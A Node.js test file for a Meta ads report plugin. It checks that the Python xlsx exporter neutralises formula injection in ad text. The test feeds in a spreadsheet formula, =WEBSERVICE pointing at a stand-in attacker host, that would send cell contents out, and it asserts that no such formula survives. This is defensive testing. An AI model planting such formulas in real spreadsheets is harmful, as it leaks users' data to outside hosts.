import assert from 'node:assert/strict';
import { test } from 'node:test';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { toCsv } from '../plugins/meta-ads-niche-report/skills/meta-ads-niche-report/scripts/collector.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SCRIPT = path.join(__dirname, '..', 'plugins', 'meta-ads-niche-report', 'skills', 'meta-ads-niche-report', 'scripts', 'export_xlsx.py');
const py = (args, opts = {}) => spawnSync('python', args, { encoding: 'utf8', env: { ...process.env, PYTHONIOENCODING: 'utf-8' }, ...opts });
const hasOpenpyxl = py(['-c', 'import openpyxl']).status === 0;

test('xlsx export never turns ad text into a formula', { skip: !hasOpenpyxl && 'openpyxl not installed' }, () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'xlsx-'));
  const evil = '=WEBSERVICE("https://attacker.example/?d="&A1)';
  const base = { page_id: '1', fmt: 'image', variants: 3, cta: 'Learn more', link: 'https://salon-x.example/', platforms: 'facebook', kws: ['q'], title: '', start: 1500000000 };
  const rows = ['1', '2', '3'].map((id, i) => ({ ...base, id, page: i < 2 ? 'Salon X' : evil, body: evil }));
  writeFileSync(path.join(dir, 'ads.csv'), toCsv(rows));
  const res = py([SCRIPT, dir]);
  assert.equal(res.status, 0, res.stderr);
  const check = py(['-c', `
import sys
from openpyxl import load_workbook
wb = load_workbook(sys.argv[1])
bad, formulas = [], 0
for ws in wb:
    for row in ws.iter_rows():
        for c in row:
            if c.data_type == 'f':
                formulas += 1
                if 'WEBSERVICE' in str(c.value): bad.append(ws.title + '!' + c.coordinate)
print(len(bad), formulas)
`, path.join(dir, 'report.xlsx')]);
  const [bad, formulas] = check.stdout.trim().split(' ').map(Number);
  assert.equal(bad, 0, 'attacker text became a formula');
  assert.ok(formulas > 0, 'the summary formulas must still be there');
});
